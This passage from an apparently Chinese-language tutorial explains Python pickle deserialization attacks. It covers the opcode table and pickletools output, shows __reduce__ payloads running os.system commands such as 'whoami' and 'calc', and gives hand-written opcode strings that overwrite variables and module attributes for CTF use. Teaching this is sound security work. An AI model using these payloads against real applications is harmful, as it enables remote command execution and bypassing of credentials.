class="hljs-string">b&#x27;Q&#x27;</span>   <span class="hljs-comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br>REDUCE         = <span class="hljs-string">b&#x27;R&#x27;</span>   <span class="hljs-comment"># apply callable to argtuple, both on stack</span><br>STRING         = <span class="hljs-string">b&#x27;S&#x27;</span>   <span class="hljs-comment"># push string; NL-terminated string argument</span><br>BINSTRING      = <span class="hljs-string">b&#x27;T&#x27;</span>   <span class="hljs-comment"># push string; counted binary string argument</span><br>SHORT_BINSTRING= <span class="hljs-string">b&#x27;U&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br>UNICODE        = <span class="hljs-string">b&#x27;V&#x27;</span>   <span class="hljs-comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span><br>BINUNICODE     = <span class="hljs-string">b&#x27;X&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br>APPEND         = <span class="hljs-string">b&#x27;a&#x27;</span>   <span class="hljs-comment"># append stack top to list below it</span><br>BUILD          = <span class="hljs-string">b&#x27;b&#x27;</span>   <span class="hljs-comment"># call __setstate__ or __dict__.update()</span><br>GLOBAL         = <span class="hljs-string">b&#x27;c&#x27;</span>   <span class="hljs-comment"># push self.find_class(modname, name); 2 string args</span><br>DICT           = <span class="hljs-string">b&#x27;d&#x27;</span>   <span class="hljs-comment"># build a dict from stack items</span><br>EMPTY_DICT     = <span class="hljs-string">b&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># push empty dict</span><br>APPENDS        = <span class="hljs-string">b&#x27;e&#x27;</span>   <span class="hljs-comment"># extend list on stack by topmost stack slice</span><br>GET            = <span class="hljs-string">b&#x27;g&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is string arg</span><br>BINGET         = <span class="hljs-string">b&#x27;h&#x27;</span>   <span class="hljs-comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br>INST           = <span class="hljs-string">b&#x27;i&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>LONG_BINGET    = <span class="hljs-string">b&#x27;j&#x27;</span>   <span class="hljs-comment"># push item from memo on stack; index is 4-byte arg</span><br>LIST           = <span class="hljs-string">b&#x27;l&#x27;</span>   <span class="hljs-comment"># build list from topmost stack items</span><br>EMPTY_LIST     = <span class="hljs-string">b&#x27;]&#x27;</span>   <span class="hljs-comment"># push empty list</span><br>OBJ            = <span class="hljs-string">b&#x27;o&#x27;</span>   <span class="hljs-comment"># build &amp; push class instance</span><br>PUT            = <span class="hljs-string">b&#x27;p&#x27;</span>   <span class="hljs-comment"># store stack top in memo; index is string arg</span><br>BINPUT         = <span class="hljs-string">b&#x27;q&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br>LONG_BINPUT    = <span class="hljs-string">b&#x27;r&#x27;</span>   <span class="hljs-comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br>SETITEM        = <span class="hljs-string">b&#x27;s&#x27;</span>   <span class="hljs-comment"># add key+value pair to dict</span><br>TUPLE          = <span class="hljs-string">b&#x27;t&#x27;</span>   <span class="hljs-comment"># build tuple from topmost stack items</span><br>EMPTY_TUPLE    = <span class="hljs-string">b&#x27;)&#x27;</span>   <span class="hljs-comment"># push empty tuple</span><br>SETITEMS       = <span class="hljs-string">b&#x27;u&#x27;</span>   <span class="hljs-comment"># modify dict by adding topmost key+value pairs</span><br>BINFLOAT       = <span class="hljs-string">b&#x27;G&#x27;</span>   <span class="hljs-comment"># push float; arg is 8-byte float encoding</span><br><br>TRUE           = <span class="hljs-string">b&#x27;I01\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br>FALSE          = <span class="hljs-string">b&#x27;I00\n&#x27;</span>  <span class="hljs-comment"># not an opcode; see INT docs in pickletools.py</span><br><br><span class="hljs-comment"># Protocol 2</span><br><br>PROTO          = <span class="hljs-string">b&#x27;\x80&#x27;</span>  <span class="hljs-comment"># identify pickle protocol</span><br>NEWOBJ         = <span class="hljs-string">b&#x27;\x81&#x27;</span>  <span class="hljs-comment"># build object by applying cls.__new__ to argtuple</span><br>EXT1           = <span class="hljs-string">b&#x27;\x82&#x27;</span>  <span class="hljs-comment"># push object from extension registry; 1-byte index</span><br>EXT2           = <span class="hljs-string">b&#x27;\x83&#x27;</span>  <span class="hljs-comment"># ditto, but 2-byte index</span><br>EXT4           = <span class="hljs-string">b&#x27;\x84&#x27;</span>  <span class="hljs-comment"># ditto, but 4-byte index</span><br>TUPLE1         = <span class="hljs-string">b&#x27;\x85&#x27;</span>  <span class="hljs-comment"># build 1-tuple from stack top</span><br>TUPLE2         = <span class="hljs-string">b&#x27;\x86&#x27;</span>  <span class="hljs-comment"># build 2-tuple from two topmost stack items</span><br>TUPLE3         = <span class="hljs-string">b&#x27;\x87&#x27;</span>  <span class="hljs-comment"># build 3-tuple from three topmost stack items</span><br>NEWTRUE        = <span class="hljs-string">b&#x27;\x88&#x27;</span>  <span class="hljs-comment"># push True</span><br>NEWFALSE       = <span class="hljs-string">b&#x27;\x89&#x27;</span>  <span class="hljs-comment"># push False</span><br>LONG1          = <span class="hljs-string">b&#x27;\x8a&#x27;</span>  <span class="hljs-comment"># push long from &lt; 256 bytes</span><br>LONG4          = <span class="hljs-string">b&#x27;\x8b&#x27;</span>  <span class="hljs-comment"># push really big long</span><br><br>_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]<br><br><span class="hljs-comment"># Protocol 3 (Python 3.x)</span><br><br>BINBYTES       = <span class="hljs-string">b&#x27;B&#x27;</span>   <span class="hljs-comment"># push bytes; counted binary string argument</span><br>SHORT_BINBYTES = <span class="hljs-string">b&#x27;C&#x27;</span>   <span class="hljs-comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span><br><br><span class="hljs-comment"># Protocol 4</span><br><br>SHORT_BINUNICODE = <span class="hljs-string">b&#x27;\x8c&#x27;</span>  <span class="hljs-comment"># push short string; UTF-8 length &lt; 256 bytes</span><br>BINUNICODE8      = <span class="hljs-string">b&#x27;\x8d&#x27;</span>  <span class="hljs-comment"># push very long string</span><br>BINBYTES8        = <span class="hljs-string">b&#x27;\x8e&#x27;</span>  <span class="hljs-comment"># push very long bytes string</span><br>EMPTY_SET        = <span class="hljs-string">b&#x27;\x8f&#x27;</span>  <span class="hljs-comment"># push empty set on the stack</span><br>ADDITEMS         = <span class="hljs-string">b&#x27;\x90&#x27;</span>  <span class="hljs-comment"># modify set by adding topmost stack items</span><br>FROZENSET        = <span class="hljs-string">b&#x27;\x91&#x27;</span>  <span class="hljs-comment"># build frozenset from topmost stack items</span><br>NEWOBJ_EX        = <span class="hljs-string">b&#x27;\x92&#x27;</span>  <span class="hljs-comment"># like NEWOBJ but work with keyword only arguments</span><br>STACK_GLOBAL     = <span class="hljs-string">b&#x27;\x93&#x27;</span>  <span class="hljs-comment"># same as GLOBAL but using names on the stacks</span><br>MEMOIZE          = <span class="hljs-string">b&#x27;\x94&#x27;</span>  <span class="hljs-comment"># store top of the stack in memo</span><br>FRAME            = <span class="hljs-string">b&#x27;\x95&#x27;</span>  <span class="hljs-comment"># indicate the beginning of a new frame</span><br><br><span class="hljs-comment"># Protocol 5</span><br><br>BYTEARRAY8       = <span class="hljs-string">b&#x27;\x96&#x27;</span>  <span class="hljs-comment"># push bytearray</span><br>NEXT_BUFFER      = <span class="hljs-string">b&#x27;\x97&#x27;</span>  <span class="hljs-comment"># push next out-of-band buffer</span><br>READONLY_BUFFER  = <span class="hljs-string">b&#x27;\x98&#x27;</span>  <span class="hljs-comment"># make top of stack readonly</span><br></code></pre></td></tr></table></figure>
<p>上文谈到了<code>opcode</code>是有多个版本的, 在进行序列化时可以通过<code>protocol=num</code>来选择<code>opcode</code>的版本, 指定的版本必须小于等于<code>5</code>.</p>
<h2 id="4-4-Pickletools"><a href="#4-4-Pickletools" class="headerlink" title="4-4-Pickletools"></a>4.4 Pickletools</h2>
<ul>
<li>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickletools<br><br>data=<span class="hljs-string">b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span><br>pickletools.dis(data)<br><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span><br>    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins exec&#x27;</span><br>   <span class="hljs-number">17</span>: q    BINPUT     <span class="hljs-number">0</span><br>   <span class="hljs-number">19</span>: X    BINUNICODE <span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span><br>   <span class="hljs-number">43</span>: q    BINPUT     <span class="hljs-number">1</span><br>   <span class="hljs-number">45</span>: \x85 TUPLE1<br>   <span class="hljs-number">46</span>: q    BINPUT     <span class="hljs-number">2</span><br>   <span class="hljs-number">48</span>: R    REDUCE<br>   <span class="hljs-number">49</span>: q    BINPUT     <span class="hljs-number">3</span><br>   <span class="hljs-number">51</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<h2 id="4-5-例子-文字说明"><a href="#4-5-例子-文字说明" class="headerlink" title="4-5-例子-文字说明"></a>4.5 例子-文字说明</h2>
<p>这里翻到其他文章采用了文字叙述的方式介绍了一个简单的opcode例子：</p>
<p>这里用一段简短的字节码来演示利用过程:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">cos<br>system<br>(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure>
<p>上文中的字节码其实就是<code>__import__('os').system(*('whoami',))</code>, 下面来分解分析一下:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">cos         =&gt;  引入模块 os.<br>system      =&gt;  引用 system, 并将其添加到 stack.<br>(S<span class="hljs-string">&#x27;whoami&#x27;</span>  =&gt;  把当前 stack 存到 metastack, 清空 stack, 再将 <span class="hljs-string">&#x27;whoami&#x27;</span> 压入 stack.<br>t           =&gt;  stack 中的值弹出并转为 <span class="hljs-built_in">tuple</span>, 把 metastack 还原到 stack, 再将 <span class="hljs-built_in">tuple</span> 压入 stack.<br>R           =&gt;  system(*(<span class="hljs-string">&#x27;whoami&#x27;</span>,)).<br>.           =&gt;  结束并返回当前栈顶元素.<br></code></pre></td></tr></table></figure>
<p>需要注意的是, 并不是所有的对象都能使用<code>pickle</code>进行序列化和反序列化, 例如文件对象和网络套接字对象以及代码对象就不可以.</p>
<h1>0x05 漏洞利用</h1>
<h2 id="5-1-漏洞原理"><a href="#5-1-漏洞原理" class="headerlink" title="5-1-漏洞原理"></a>5.1 漏洞原理</h2>
<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化，反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码.</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20220324162032-45c29bc2-ab4b-1.png" class='item-img' data-src='image-20231116204056120.png'><img src="image-20231116204056120.png" alt="image-20231116204056120"></a></p>
<p>简单来说, <code>__reduce__()</code>魔术方法类似于<code>PHP</code>中的<code>__wakeup()</code>方法, 在反序列化时会先调用<code>__reduce__()</code>魔术方法.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其序列化之后返回.<br>2.如果返回值是一个元组, 要求是2到6个参数(Python3.8新加入元组的第六项).<br>	i.第一个参数是可调用的对象.<br>	ii.第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.<br>	iii.第三个是用于表示对象的状态的可选元素, 将被传给前述的__setstate__()方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至__dict__属性中.<br>	iv.第四个是用于返回连续项的迭代器的可选元素.<br>	v.第五个是用于返回连续键值对的迭代器的可选元素.<br>	vi.第六个是一个带有(obj, state)签名的可调用对象的可选元素.<br></code></pre></td></tr></table></figure>
<p>这里依旧展示一下小迪的Demo，浅浅了解Python反序列化漏洞的为何会产生</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment">#反序列化安全漏洞产生-DEMO</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-comment"># 定义构造函数，将传入的参数进行了赋值</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, func, arg</span>):<br>        self.func = func<br>        self.arg = arg<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;This is A&#x27;</span>)<br>    <span class="hljs-comment"># 定义reduce方法，这里将传入的参数分别当做了函数及参数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;反序列化调用&#x27;</span>)<br>        <span class="hljs-keyword">return</span> (self.func, self.arg)<br>a = A(os.system, (<span class="hljs-string">&#x27;calc&#x27;</span>,))<br>p_a = pickle.dumps(a)<br>pickle.loads(p_a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;==========&#x27;</span>)<br><span class="hljs-built_in">print</span>(p_a)<br></code></pre></td></tr></table></figure>
<p>很明显如果我们此时运行程序的话，就会执行calc命令，这也就是说我们可以传入一些带恶意数据的序列化字符串，将其传入到某个具有反序列化功能的点，那就会执行我们的恶意数据，可以进一步开展后续工作了。</p>
<p class='item-img' data-src='image-20231213191517323.png'><img src="image-20231213191517323.png" alt="image-20231213191517323"></p>
<h2 id="5-2-利用思路"><a href="#5-2-利用思路" class="headerlink" title="5-2-利用思路"></a>5.2 利用思路</h2>
<ul>
<li>任意代码执行或命令执行。</li>
<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li>
</ul>
<h2 id="5-3-初步认识：pickle-EXP的简单demo"><a href="#5-3-初步认识：pickle-EXP的简单demo" class="headerlink" title="5-3-初步认识：pickle-EXP的简单demo"></a>5.3 初步认识：pickle EXP的简单demo</h2>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        s = <span class="hljs-string">&quot;&quot;&quot;echo test &gt;poc.txt&quot;&quot;&quot;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        <span class="hljs-keyword">return</span> os.system, (s,)        <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br>e = genpoc()<br>poc = pickle.dumps(e)<br><br><span class="hljs-built_in">print</span>(poc) <span class="hljs-comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span><br></code></pre></td></tr></table></figure>
<ul>
<li>变量覆盖</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><br>key1 = <span class="hljs-string">b&#x27;321&#x27;</span><br>key2 = <span class="hljs-string">b&#x27;123&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))<br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(pickle_a)<br>pickle.loads(pickle_a)<br><span class="hljs-built_in">print</span>(key1, key2)<br></code></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&quot;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c\x13key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;\x94\x85\x94R\x94.&quot;</span><br><span class="hljs-string">b&#x27;1&#x27;</span> <span class="hljs-string">b&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure>
<h2 id="5-4-如何手写opcode"><a href="#5-4-如何手写opcode" class="headerlink" title="5-4-如何手写opcode"></a>5.4 如何手写opcode</h2>
<ul>
<li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li>
<li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
<li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。</li>
</ul>
<h3 id="5-4-1-常用opcode解析"><a href="#5-4-1-常用opcode解析" class="headerlink" title="5-4-1-常用opcode解析"></a>5.4.1 常用opcode解析</h3>
<p>为了充分理解栈的作用，强烈建议一边看动图一边学习opcode的作用：</p>
<p class='item-img' data-src='20200320230711-7972c0ea-6abc-1.gif'><img src="20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
<p>由于pickle库中的注释不是很详细，网上的其他资料也没有具体地把栈和memo上的变化讲清楚，以下的每个opcode的操作都是hachp1师傅经过实验验证并且尽可能将栈和memo上的变化解释清楚，常用的opcode如下：</p>
<table>
<thead>
<tr>
<th>opcode</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo上的变化</th>
</tr>
</thead>
<tbody>
<tr>
<td>c</td>
<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n（也可以使用双引号、'等python字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
<td>无</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
<td>无</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
<td>无</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
<td>无</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
<td>无</td>
</tr>
</tbody>
</table>
<p>此外， <code>TRUE</code> 可以用 <code>I</code> 表示： <code>b'I01\n'</code> ； <code>FALSE</code> 也可以用 <code>I</code> 表示： <code>b'I00\n'</code> ，其他opcode可以在<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/master/Lib/pickle.py#L111">pickle库的源代码</a>中找到。<br>
由这些opcode我们可以得到一些需要注意的地方：</p>
<ul>
<li>编写opcode时要想象栈中的数据，以正确使用每种opcode。</li>
<li>在理解时注意与python本身的操作对照（比如python列表的<code>append</code>对应<code>a</code>、<code>extend</code>对应<code>e</code>；字典的<code>update</code>对应<code>u</code>）。</li>
<li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li>
<li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li>
<li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li>
</ul>
<h3 id="5-4-2-拼接opcode"><a href="#5-4-2-拼接opcode" class="headerlink" title="5-4-2-拼接opcode"></a>5.4.2 拼接opcode</h3>
<p>将第一个pickle流结尾表示结束的 <code>.</code> 去掉，将第二个pickle流与第一个拼接起来即可。</p>
<h4 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h4>
<p>python源码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># secret.py</span><br>name=<span class="hljs-string">&#x27;TEST3213qkfsmfo&#x27;</span><br><span class="hljs-comment"># main.py</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> secret<br><br>opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret.name)<br><br>output=pickle.loads(opcode.encode())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output:&#x27;</span>,output)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,secret.name)<br></code></pre></td></tr></table></figure>
<p>首先，通过 <code>c</code> 获取全局变量 <code>secret</code> ，然后建立一个字典，并使用 <code>b</code> 对secret进行属性设置，使用到的payload：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">opcode=<span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&#x27;1&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">before: TEST3213qkfsmfo<br>output: &lt;module <span class="hljs-string">&#x27;secret&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;D:\\Pythonproject\\Pickle_Study\\secret.py&#x27;</span>&gt;<br>after: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<h4 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h4>
<p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p>
<p><code>R</code> ：</p>
